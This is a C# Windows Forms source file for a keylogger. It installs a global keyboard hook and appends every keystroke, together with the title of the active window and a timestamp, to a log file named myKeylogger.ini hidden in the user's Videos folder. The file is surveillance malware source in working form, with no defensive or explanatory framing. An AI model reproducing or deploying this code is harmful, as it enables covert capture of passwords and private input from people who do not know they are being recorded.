using MyKeylogger.Lib;
using MyKeylogger.Lib.WinApi;
using System;
using System.IO;
using System.Windows.Forms;
using tt;

namespace keylog
{
    public partial class Form1 : Form
    {
        //bat key
        private readonly KeyboardHookListener keyListener;
        private IntPtr lastActiveWindow = IntPtr.Zero;
        private bool hasSubmitted;
        private readonly KeyMapper keyMapper = new KeyMapper();
        private readonly string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger.ini";
        public  Form1()
        {
            InitializeComponent();
            Functions.CreateFile();
            keyListener = new KeyboardHookListener(new GlobalHooker());
            keyListener.KeyDown += KeyListener_KeyDown;

        }

        private void KeyListener_KeyDown(object sender, KeyEventArgs e)
        {
            if(lastActiveWindow != Functions.GetForegroundWindow())
            {
                var format = @"[""{0}"" {1}]" + Environment.NewLine + Environment.NewLine;
                var text = string.Format(format, Functions.GetActiveWindowText(), DateTime.Now);
                if(hasSubmitted)
                {
                    text = text.Insert(0, Environment.NewLine + Environment.NewLine);
                }
                File.AppendAllText(filePath, text);
                hasSubmitted = true;
                lastActiveWindow = Functions.GetForegroundWindow();
            }
            var keyText = keyMapper.GetKeyText(e.KeyCode);
            File.AppendAllText(filePath, keyText);
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            keyListener.Enabled = true;
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            keyListener.Enabled = false;
        }

    }
}
